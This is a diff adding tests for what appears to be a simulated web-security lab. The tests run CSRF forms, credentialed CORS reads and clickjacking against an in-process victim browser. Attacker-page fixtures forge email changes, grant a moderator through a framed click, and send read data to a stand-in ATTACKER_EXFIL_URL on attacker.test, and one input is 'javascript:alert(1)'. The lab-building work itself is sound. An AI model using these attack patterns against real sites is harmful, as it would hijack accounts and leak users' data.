@@ -1,14 +1,16 @@
 // The simulated victim across sites (engine task E1, docs/RECIPES.md section 8 "Across sites"): the SameSite jar,
 // Origin / Sec-Fetch shaping, CORS reads, framing, and the attacker-page presets. Everything is in process: no HTTP,
 // no socket (the guard in tests/sim.spec.ts covers src/core/sim/ as a whole).
-import { describe, expect, it } from 'vitest';
-import { perSession } from '../src/core/lab.js';
+import type { Request } from 'express';
+import { describe, expect, it, onTestFinished } from 'vitest';
+import { cappedBudgetUsage, perSession, setCappedBudget } from '../src/core/lab.js';
 import type { Level } from '../src/core/levels.js';
 import { Jar, sameSiteSends, sameSiteStores, type SimCookieContext, type SimSameSite } from '../src/core/sim/cookies.js';
 import { bodyFields, framingOf } from '../src/core/sim/cross.js';
 import {
-  ADMIN_MAILBOX, SIM_FORM_BOUNDARY, classifySimUrl, simWorld, type SimFormFields, type SimHandler, type SimRequest, type SimResponse,
-  type SimWorld,
+  ADMIN_MAILBOX, ATTACKER_EXFIL_URL, PLAYER_MAILBOX, SIM_FORM_BOUNDARY, SIM_LIMITS, VICTIM_LABELS, classifySimUrl, frameAndClickAction,
+  sendAttackerPageAction, simWorld, visitAttackerPageAction,
+  type AttackerScript, type SimBrowser, type SimFormFields, type SimHandler, type SimRequest, type SimResponse, type SimWorld,
 } from '../src/core/sim.js';
 
 let n = 0;
@@ -812,6 +814,329 @@ describe('clickThrough: the admin clicks your decoy over the framed page\'s butt
     expect(() => v.b.clickThrough(f, '/x', {})).toThrow(/a frame this browser loaded/);
     expect(() => v.b.clickThrough({ ...f }, '/x', {})).toThrow(/a frame this browser loaded/);
     expect(() => v.b.clickThrough(null as never, '/x', {})).toThrow(/a frame this browser loaded/);
+  });
+});
+
+describe('a relative URL on the attacker page resolves against that page, as in a browser', () => {
+  it('a relative form action, link, fetch or frame goes to your own server', () => {
+    const v = victim();
+    const page = { url: 'http://attacker.test/pages/csrf.html' };
+    v.b.crossSitePost('/account/email', { a: '1' }, { page });
+    v.b.crossSiteLink('next.html', { page });
+    v.b.corsFetch('//citadel.test/api/me', { page }); // scheme-relative: the citadel
+    v.b.frame('frame.html', { page });
+    expect(v.w.attackerLog.entries().map((h) => `${h.method} ${h.url}`)).toEqual([
+      'POST http://attacker.test/account/email', 'GET http://attacker.test/pages/next.html', 'GET http://attacker.test/pages/frame.html',
+    ]);
+    expect(v.seen.map((r) => r.url)).toEqual(['http://citadel.test/api/me']);
+  });
+});
+
+// --- The presets: the admin opens your page ----------------------------------------------------------------------
+
+/**
+ * A forum in miniature, as the admin's browser sees it: a change-email form (FP-01's shape) whose confirmation mail
+ * goes to the new address, a JSON API (FP-03's), and a confirm page whose button grants a moderator (FP-04's). The
+ * admin's session cookie is `sid`, with the SameSite the test picks: the levels' decision in a real lab.
+ */
+function forum(opts: { readonly sameSite?: SimSameSite; readonly cors?: boolean; readonly xfo?: string } = {}) {
+  const w = world();
+  const seen: SimRequest[] = [];
+  const state = { email: 'citadel_admin@citadel.test', moderators: [] as string[], page: undefined as AttackerScript | undefined };
+  const signedIn = (r: SimRequest): boolean => r.cookies.sid === 'admin';
+  const handler: SimHandler = (r) => {
+    seen.push(r);
+    if (r.path === '/account/email' && r.method === 'POST') {
+      if (!signedIn(r)) return { status: 403, body: 'Sign in first.' };
+      state.email = r.body.email ?? '';
+      w.inbox.deliver({ from: 'forum@citadel.test', to: state.email, subject: 'Confirm your new address', body: 'canary CANARY-7' });
+      return { status: 303, headers: { location: '/account' } };
+    }
+    if (r.path === '/api/me') {
+      const cors = opts.cors ? { 'Access-Control-Allow-Origin': r.headers.origin ?? '', 'Access-Control-Allow-Credentials': 'true' } : {};
+      return { status: 200, headers: cors, body: JSON.stringify(signedIn(r) ? { user: 'citadel_admin', canary: 'CANARY-7' } : { user: null }) };
+    }
+    if (r.path === '/moderation/confirm') return { status: 200, headers: opts.xfo ? { 'X-Frame-Options': opts.xfo } : {}, body: signedIn(r) ? 'Grant? [Approve]' : 'Sign in' };
+    if (r.path === '/moderation/grant' && r.method === 'POST') {
+      if (!signedIn(r)) return { status: 403, body: 'Sign in first.' };
+      state.moderators.push(r.body.user ?? '');
+      return { status: 200, body: 'Granted.' };
+    }
+    return { status: 200, body: 'Forum' };
+  };
+  const admin = inSession(() => w.browser(handler));
+  const sameSite = opts.sameSite ?? 'None';
+  const rearm = (_req: Request, b: SimBrowser): void => { b.cookies.set('sid', 'admin', sameSite === 'None' ? { sameSite, secure: true } : { sameSite }); };
+  return { w, admin, seen, state, rearm };
+}
+const REQ = {} as Request; // the presets hand it to the lab's own accessors only
+const exfils = (w: SimWorld) => w.attackerLog.entries().filter((h) => h.url === ATTACKER_EXFIL_URL);
+
+describe('visitAttackerPageAction: the admin opens your page, which does what you wrote on it', () => {
+  const visit = (f: ReturnType<typeof forum>) => visitAttackerPageAction({ browser: () => f.admin, page: () => f.state.page, rearm: f.rearm });
+
+  it('is a victim action with bilingual defaults; with no page written it says so and browses nothing', () => {
+    const f = forum();
+    const a = visit(f);
+    expect(a).toMatchObject({ name: 'visit-attacker-page', label: VICTIM_LABELS.visitPage });
+    expect(a.input).toBeUndefined();
+    expect(a.description?.en).toBe('opens your page on attacker.test, which does what you wrote on it');
+    expect(a.description?.id).toMatch(/halaman Anda di attacker\.test/);
+    expect(a.run(REQ, { url: '' })).toEqual({ id: 'Anda belum menulis halaman penyerang Anda.', en: 'You have not written your attacker page yet.' });
+    expect(f.seen).toEqual([]);
+    expect(f.admin.cookies.get('sid')).toBe('admin'); // re-armed first, even so
+  });
+
+  it('a form (CSRF, FP-01): your server logs the page load, the forged POST changes the admin\'s email, the mail lands in YOUR inbox', () => {
+    const f = forum({ sameSite: 'None' });
+    f.state.page = { does: { kind: 'form', action: 'http://citadel.test/account/email', fields: { email: PLAYER_MAILBOX } } };
+    expect(visit(f).run(REQ, { url: '' })).toBeUndefined();
+    expect(f.w.attackerLog.entries().map((h) => `${h.method} ${h.url}`)).toEqual(['GET http://attacker.test/']);
+    expect(f.state.email).toBe(PLAYER_MAILBOX);
+    expect(f.w.inbox.newest(PLAYER_MAILBOX)?.body).toBe('canary CANARY-7');
+    expect(f.seen[0]).toMatchObject({ method: 'POST', headers: { origin: 'http://attacker.test', 'sec-fetch-site': 'cross-site' } });
+    expect(f.w.visits.map((x) => x.outcome)).toEqual(['attacker', 'page']);
+  });
+
+  it('the same form against a Lax (the default) or Strict session: the cookie stays home, the citadel refuses', () => {
+    for (const sameSite of ['Lax', 'Strict'] as const) {
+      const f = forum({ sameSite });
+      f.state.page = { does: { kind: 'form', action: 'http://citadel.test/account/email', fields: { email: PLAYER_MAILBOX } } };
+      visit(f).run(REQ, { url: '' });
+      expect([f.seen[0].cookies.sid, f.state.email], sameSite).toEqual([undefined, 'citadel_admin@citadel.test']);
+    }
+  });
+
+  it('a GET form or a link is a top-level GET: a Lax session goes along (Lax does not protect a state change on GET)', () => {
+    const f = forum({ sameSite: 'Lax' });
+    f.state.page = { does: { kind: 'form', method: 'GET', action: 'http://citadel.test/account/email?old=1', fields: { email: PLAYER_MAILBOX } } };
+    visit(f).run(REQ, { url: '' });
+    expect(f.seen[0]).toMatchObject({ method: 'GET', url: `http://citadel.test/account/email?email=${encodeURIComponent(PLAYER_MAILBOX)}`, cookies: { sid: 'admin' } });
+    f.state.page = { does: { kind: 'link', url: 'http://citadel.test/moderation/confirm' } };
+    visit(f).run(REQ, { url: '' });
+    expect(f.seen[1]).toMatchObject({ method: 'GET', path: '/moderation/confirm', cookies: { sid: 'admin' }, headers: { 'sec-fetch-site': 'cross-site' } });
+  });
+
+  it('the form\'s enctype and the page\'s place and policy are the lab\'s to pass on (FP-01 Inquisitor: text/plain)', () => {
+    const f = forum();
+    f.state.page = {
+      page: { url: 'http://citadel.attacker.test/x', referrerPolicy: 'no-referrer' },
+      does: { kind: 'form', action: 'http://citadel.test/account/email', enctype: 'text/plain', fields: [['email', PLAYER_MAILBOX]] },
+    };
+    visit(f).run(REQ, { url: '' });
+    expect(f.w.attackerLog.entries()[0].url).toBe('http://citadel.attacker.test/x');
+    expect(f.seen[0]).toMatchObject({ rawBody: `email=${PLAYER_MAILBOX}\r\n`, headers: { 'content-type': 'text/plain', origin: 'null' } });
+    expect(f.seen[0].headers.referer).toBeUndefined();
+  });
+
+  it('a fetch (CORS, FP-03): a readable answer is sent home to ATTACKER_EXFIL_URL; a blocked one sends nothing', () => {
+    const open = forum({ cors: true });
+    open.state.page = { does: { kind: 'fetch', url: 'http://citadel.test/api/me', credentials: 'include' } };
+    expect(visit(open).run(REQ, { url: '' })).toEqual({ id: 'Halaman Anda membaca jawabannya dan mengirimkannya ke server Anda.', en: 'Your page read the answer and sent it to your server.' });
+    expect(exfils(open.w).map((h) => [h.method, JSON.parse(h.body ?? '')])).toEqual([['POST', { user: 'citadel_admin', canary: 'CANARY-7' }]]);
+    const closed = forum({ cors: false });
+    closed.state.page = open.state.page;
+    expect((visit(closed).run(REQ, { url: '' }) as { en: string }).en).toMatch(/did not let your page read the answer: it has no Access-Control-Allow-Origin/);
+    expect(exfils(closed.w)).toEqual([]);
+    expect(closed.seen).toHaveLength(1); // sent all the same
+  });
+
+  it('a fetch the browser will not send says why (FP-02: a JSON Content-Type needs a preflight)', () => {
+    const f = forum();
+    f.state.page = { does: { kind: 'fetch', url: 'http://citadel.test/account/prefs', method: 'POST', credentials: 'include', body: '{}', headers: { 'Content-Type': 'application/json' } } };
+    expect((visit(f).run(REQ, { url: '' }) as { en: string }).en).toMatch(/needs a CORS preflight/);
+    expect(f.seen).toEqual([]);
+    f.state.page = { does: { kind: 'fetch', url: 'http://citadel.test/', body: 'x' } };
+    expect((visit(f).run(REQ, { url: '' }) as { en: string }).en).toMatch(/threw before sending/);
+    f.state.page = { does: { kind: 'fetch', url: 'http://attacker.test/x' } };
+    expect((visit(f).run(REQ, { url: '' }) as { en: string }).en).toMatch(/got no citadel\.test answer/);
+  });
+
+  it('a page whose place is not on attacker.test is not opened (the lab passed the player\'s URL on)', () => {
+    const f = forum();
+    f.state.page = { page: { url: 'http://citadel.test/' }, does: { kind: 'link', url: 'http://citadel.test/' } };
+    expect((visit(f).run(REQ, { url: '' }) as { en: string }).en).toMatch(/not on your server/);
+    expect([f.seen, f.w.attackerLog.entries()]).toEqual([[], []]);
+  });
+
+  it('a malformed page from the lab is a programming error (the action fails)', () => {
+    const f = forum();
+    for (const bad of [null, {}, { does: null }, { does: { kind: 'script' } }, { does: { kind: 'form', fields: {} } }, { does: { kind: 'link' } }]) {
+      f.state.page = bad as never;
+      expect(() => visit(f).run(REQ, { url: '' }), JSON.stringify(bad)).toThrow(/attacker page/);
+    }
+  });
+});
+
+describe('sendAttackerPageAction: your page lives at the link you send', () => {
+  const send = (f: ReturnType<typeof forum>) => sendAttackerPageAction({ browser: () => f.admin, page: () => f.state.page, rearm: f.rearm });
+
+  it('takes the link field; the page runs at that link (its origin and path are yours to choose)', () => {
+    const f = forum();
+    f.state.page = { page: { url: 'http://attacker.test/ignored' }, does: { kind: 'form', action: 'http://citadel.test/account/email', fields: { email: PLAYER_MAILBOX } } };
+    const a = send(f);
+    expect(a).toMatchObject({ name: 'send-attacker-page', label: VICTIM_LABELS.sendPage, input: 'url' });
+    expect(a.description?.en).toBe('opens the link to your page on attacker.test that you send; the page does what you wrote on it');
+    a.run(REQ, { url: 'http://citadel.test.attacker.test/citadel?yes' });
+    expect(f.w.attackerLog.entries()[0].url).toBe('http://citadel.test.attacker.test/citadel?yes');
+    expect(f.seen[0].headers.origin).toBe('http://citadel.test.attacker.test');
+  });
+
+  it('a link off attacker.test is never opened: this preset is no free-form "send link"', () => {
+    const f = forum();
+    f.state.page = { does: { kind: 'link', url: 'http://citadel.test/' } };
+    for (const url of ['http://citadel.test/account/email', 'javascript:alert(1)', '', 'http://example.com/']) {
+      expect((send(f).run(REQ, { url }) as { en: string }).en, url).toMatch(/not on your server/);
+    }
+    expect([f.seen, f.w.attackerLog.entries(), f.w.visits]).toEqual([[], [], []]);
+    f.state.page = undefined;
+    expect((send(f).run(REQ, { url: 'http://attacker.test/' }) as { en: string }).en).toMatch(/not written your attacker page/);
+  });
+});
+
+describe('frameAndClickAction: the admin opens your framing page and clicks your decoy', () => {
+  const confirmForm = (_req: Request, framed: { readonly url: string }) =>
+    (new URL(framed.url).pathname === '/moderation/confirm' ? { action: '/moderation/grant', fields: { user: 'pilgrim' } } : undefined);
+  const action = (f: ReturnType<typeof forum>, click = confirmForm) => frameAndClickAction({ browser: () => f.admin, click, rearm: f.rearm });
+
+  it('frames the link you send; when shown, the click submits the framed page\'s form with the admin\'s (None) session', () => {
+    const f = forum({ sameSite: 'None' });
+    const a = action(f);
+    expect(a).toMatchObject({ name: 'frame-and-click', label: VICTIM_LABELS.frameAndClick, input: 'url' });
+    expect(a.description?.en).toBe('opens your page, which frames the citadel.test link you send, and clicks your decoy button');
+    expect(a.run(REQ, { url: 'http://citadel.test/moderation/confirm' })).toBeUndefined();
+    expect(f.state.moderators).toEqual(['pilgrim']);
+    expect(f.seen.map((r) => [r.method, r.path, r.headers['sec-fetch-dest'], r.cookies.sid])).toEqual([
+      ['GET', '/moderation/confirm', 'iframe', 'admin'], ['POST', '/moderation/grant', 'iframe', 'admin'],
+    ]);
+    expect(f.w.attackerLog.entries().map((h) => h.url)).toEqual(['http://attacker.test/']); // your framing page's load
+  });
+
+  it('a Lax session is not sent into the frame (Chrome): the framed page is signed out, the click is refused', () => {
+    const f = forum({ sameSite: 'Lax' });
+    action(f).run(REQ, { url: 'http://citadel.test/moderation/confirm' });
+    expect(f.state.moderators).toEqual([]);
+    expect(f.seen.map((r) => [r.path, r.cookies.sid])).toEqual([['/moderation/confirm', undefined], ['/moderation/grant', undefined]]);
+  });
+
+  it('a page that refuses the frame: no click, and the note names the header', () => {
+    for (const [xfo, note] of [['DENY', /X-Frame-Options/], ['SAMEORIGIN', /X-Frame-Options/]] as const) {
+      const f = forum({ xfo });
+      expect((action(f).run(REQ, { url: 'http://citadel.test/moderation/confirm' }) as { en: string }).en).toMatch(note);
+      expect([f.state.moderators, f.seen.length]).toEqual([[], 1]);
+    }
+    const f = forum();
+    expect((action(f).run(REQ, { url: 'http://attacker.test/inner' }) as { en: string }).en).toMatch(/shows no citadel\.test page/);
+  });
+
+  it('a framed page with no button under the decoy: the click does nothing (the lab says which pages have one)', () => {
+    const f = forum();
+    expect((action(f).run(REQ, { url: 'http://citadel.test/' }) as { en: string }).en).toMatch(/no button under your decoy/);
+    expect(f.seen).toHaveLength(1);
+    expect(() => action(f, (() => ({ action: 5 })) as never).run(REQ, { url: 'http://citadel.test/' })).toThrow(/click\(req, framed\) must return/);
+  });
+
+  it('the click callback sees the framed page; the framing page can be placed by the lab', () => {
+    const f = forum();
+    const framed: unknown[] = [];
+    frameAndClickAction({
+      browser: () => f.admin, rearm: f.rearm, page: () => ({ url: 'http://x.attacker.test/decoy' }),
+      click: (_req, p) => { framed.push(p); return undefined; },
+    }).run(REQ, { url: 'http://citadel.test/moderation/confirm?id=3' });
+    expect(framed).toEqual([{ url: 'http://citadel.test/moderation/confirm?id=3', status: 200, body: 'Grant? [Approve]' }]);
+    expect(f.seen[0].headers.referer).toBe('http://x.attacker.test/');
+  });
+});
+
+describe('the cross-site presets: options and re-arm', () => {
+  const browser = () => { throw new Error('not called'); };
+  const page = () => undefined;
+  const click = () => undefined;
+
+  it('rearm is required (an explicit no-op when the victim has no standing state); page and click must be functions', () => {
+    expect(() => visitAttackerPageAction({ browser, page } as never)).toThrow(/visitAttackerPageAction: rearm is required/);
+    expect(() => sendAttackerPageAction({ browser, page } as never)).toThrow(/sendAttackerPageAction: rearm is required/);
+    expect(() => frameAndClickAction({ browser, click } as never)).toThrow(/frameAndClickAction: rearm is required/);
+    expect(() => visitAttackerPageAction({ browser, page: 'x' as never, rearm: () => {} })).toThrow(/page must be a function/);
+    expect(() => sendAttackerPageAction({ browser: 'x' as never, page, rearm: () => {} })).toThrow(/browser must be a function/);
+    expect(() => frameAndClickAction({ browser, click: 'x' as never, rearm: () => {} })).toThrow(/click must be a function/);
+    expect(() => frameAndClickAction({ browser, click, page: 'x' as never, rearm: () => {} })).toThrow(/page must be a function/);
+    expect(() => frameAndClickAction({ browser, click, rearm: () => {} })).not.toThrow();
+  });
+
+  it('the re-arm runs first in every action, before the victim browses (the player\'s page may have signed it out)', () => {
+    const f = forum();
+    f.admin.cookies.clear();
+    f.state.page = { does: { kind: 'form', action: 'http://citadel.test/account/email', fields: { email: PLAYER_MAILBOX } } };
+    visitAttackerPageAction({ browser: () => f.admin, page: () => f.state.page, rearm: f.rearm }).run(REQ, { url: '' });
+    expect(f.state.email).toBe(PLAYER_MAILBOX);
+    f.admin.cookies.clear();
+    frameAndClickAction({ browser: () => f.admin, click: () => ({ action: '/moderation/grant', fields: { user: 'p' } }), rearm: f.rearm })
+      .run(REQ, { url: 'http://citadel.test/moderation/confirm' });
+    expect(f.state.moderators).toEqual(['p']);
+  });
+});
+
+describe('budget, caps and copies: across sites adds no state', () => {
+  it('the primitives and presets add nothing to the byte budget: a world and its browser weigh what they did before E1', () => {
+    // This file fills the shared budget with worlds; lift it for the test, so the new instance evicts nothing.
+    const prev = setCappedBudget(1024 * 1024 * 1024);
+    onTestFinished(() => { setCappedBudget(prev); });
+    const before = cappedBudgetUsage().bytes;
+    const lab = perSession(() => { const w = simWorld({ mailboxes: [ADMIN_MAILBOX] }); return { w, b: w.browser(() => ({ status: 200, headers: { 'Access-Control-Allow-Origin': '*' } })) }; })
+      .for({ sessionId: `cross-weigh-${++n}`, level: 'acolyte' });
+    const made = cappedBudgetUsage().bytes;
+    expect(made - before).toBe(SIM_LIMITS.inboxWeight + SIM_LIMITS.attackerLogWeight + SIM_LIMITS.visitsWeight + SIM_LIMITS.browserWeight);
+    const page = (): AttackerScript => ({ does: { kind: 'fetch', url: 'http://citadel.test/api/me' } });
+    for (let i = 0; i < 10; i++) { // outside any factory: none of this asks for budget (it would throw if it did)
+      visitAttackerPageAction({ browser: () => lab.b, page, rearm: () => {} }).run(REQ, { url: '' });
+      sendAttackerPageAction({ browser: () => lab.b, page, rearm: () => {} }).run(REQ, { url: 'http://attacker.test/' });
+      frameAndClickAction({ browser: () => lab.b, click: () => ({ action: '/x', fields: {} }), rearm: () => {} }).run(REQ, { url: 'http://citadel.test/' });
+      lab.b.crossSiteLink('http://citadel.test/');
+      lab.b.crossSitePost('http://citadel.test/', {});
+    }
+    expect(cappedBudgetUsage().bytes).toBe(made);
+  });
+
+  it(`the world's caps hold: at most ${SIM_LIMITS.visits} visits and ${SIM_LIMITS.logEntries} log entries, however many requests`, () => {
+    const f = forum({ cors: true });
+    for (let i = 0; i < 40; i++) {
+      f.admin.corsFetch('http://citadel.test/api/me', { credentials: 'include' });
+      f.admin.crossSitePost('http://attacker.test/collect', { i: String(i) });
+      f.admin.frame('http://citadel.test/moderation/confirm');
+    }
+    expect(f.w.visits).toHaveLength(SIM_LIMITS.visits);
+    expect(f.w.attackerLog.entries()).toHaveLength(SIM_LIMITS.logEntries);
+    expect(f.w.attackerLog.total).toBe(40);
+  });
+
+  it('what they keep is a copy: a huge answer, form or page URL does not stay alive behind a short kept string', () => {
+    const gc = (globalThis as { gc?: () => void }).gc;
+    if (typeof gc !== 'function') throw new Error('globalThis.gc is missing: run the specs with --expose-gc (vitest.config.ts)');
+    const big = (tag: string) => tag.padEnd(200_000, 'x');
+    const labs = Array.from({ length: 6 }, () => {
+      const w = world();
+      let i = 0;
+      const b = inSession(() => w.browser(() => ({ status: 200, headers: { 'Access-Control-Allow-Origin': '*' }, body: big(`answer-${++i}`) })));
+      return { w, b };
+    });
+    gc(); gc();
+    const before = process.memoryUsage().heapUsed;
+    const kept: unknown[] = [];
+    labs.forEach(({ w, b }, l) => {
+      for (let v = 0; v < SIM_LIMITS.visits; v++) {
+        const page = { url: `http://attacker.test/p${l}${v}?${'q'.repeat(1900)}#${'f'.repeat(100)}`, referrerPolicy: 'unsafe-url' };
+        const f = b.corsFetch('http://citadel.test/api', { page });
+        w.attackerLog.record({ method: 'POST', url: ATTACKER_EXFIL_URL, body: f.body ?? '' }); // what the preset sends home
+        kept.push(f, b.frame('http://citadel.test/frame', { page }));
+        b.crossSitePost('http://attacker.test/collect', { big: big(`form-${l}-${v}`) }, { page });
+      }
+    });
+    gc(); gc();
+    // As views of their parents: 6 x 5 x (2 answers + 1 log body + 1 form) x 200 KB = 24 MB. As copies: well under 2 MiB.
+    expect(process.memoryUsage().heapUsed - before).toBeLessThan(2 * 1024 * 1024);
+    expect(kept).toHaveLength(60);
+    expect(labs[0].w.attackerLog.entries().at(-1)?.body).toHaveLength(SIM_LIMITS.urlLength);
   });
 });
 
